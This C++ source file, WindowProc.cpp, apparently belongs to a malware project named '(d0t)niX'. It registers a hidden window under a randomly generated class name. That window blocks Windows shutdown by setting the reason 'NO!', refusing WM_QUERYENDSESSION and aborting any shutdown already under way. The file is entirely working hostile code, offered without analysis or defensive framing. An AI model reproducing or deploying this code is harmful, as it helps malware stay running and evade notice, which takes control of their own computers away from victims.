/*-----------------------------------------------------+-------------------------------\
 |    ___    __________   __  ___          ______  ___ |  __      __    _____________  |
 |   /  / __| _/\   _  \_/  |_\  \   ____ |__\   \/  / | /  \    /  \__| _/\______   \ |
 |  /  / / __ | /  /_\  \   __\\  \ /    \|  |\     /  | \   \/\/   / __ |  |     ___/ |
 | (  ( / /_/ | \  \_/   \  |   )  )   |  \  |/     \  |  \        / /_/ |  |    |     |
 |  \  \\____ |  \_____  /__|  /  /|___|  /__/___/\  \ |   \__/\  /\____ |  |____|     |
 |   \__\    \/        \/     /__/      \/         \_/ |        \/      \/             |
 +-----------------------------------------------------+--+----------------------------/
 | WindowProc.cpp :: (d0t)niX's Window Process/Procedures |
 \--------------------------------------------------------*/

#include "../../Header-Files/pch.h"
#include "../../Header-Files/(d0t)niX.h"

LRESULT CALLBACK WndProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
	switch (uMsg) {
		case WM_CREATE:
			ShutdownBlockReasonCreate(hWnd, L"NO!");
		break;
		case WM_QUERYENDSESSION:
			return FALSE;
		break;
		case WM_ENDSESSION:
			AbortSystemShutdownW(NULL);
		default:
			return DefWindowProcW(hWnd, uMsg, wParam, lParam);
	}

	return DefWindowProcW(hWnd, uMsg, wParam, lParam);
}

DWORD WINAPI thWindowThread(
	_In_ HANDLE hHeap,
	_In_ LPVOID lParam
) {
	WNDCLASSEX wcex;
	ZeroMemory(&wcex, sizeof(wcex));

	wcex.cbSize = sizeof(wcex);
	wcex.lpfnWndProc = WndProc;
	wcex.lpszClassName = fnCryptGenRandomStringW(hHeap, NULL, nRNG_RAN(nMIN_RS_LEN, nMAX_RS_LEN), szCharSet, cculCharSet);

	RegisterClassExW(&wcex);

	HWND hWnd = CreateWindowExW(0, wcex.lpszClassName, wcex.lpszClassName, WS_OVERLAPPEDWINDOW, 0, 0, 100, 100, NULL, NULL, NULL, NULL);
	if (hWnd) {
		MSG mMsg; BOOL bRet;
		while ((bRet = GetMessageW(&mMsg, NULL, 0, 0)) != 0) {
			if (bRet == -1) {
				fnMessageHandlerW(NULL, L"Couldn't get Message", L"GetMessageW", MB_ICONERROR);
			} else {
				TranslateMessage(&mMsg);
				DispatchMessageW(&mMsg);
			}
		}
	}

	HeapFree(hHeap, NULL, (LPVOID)wcex.lpszClassName);
	return TRUE;
}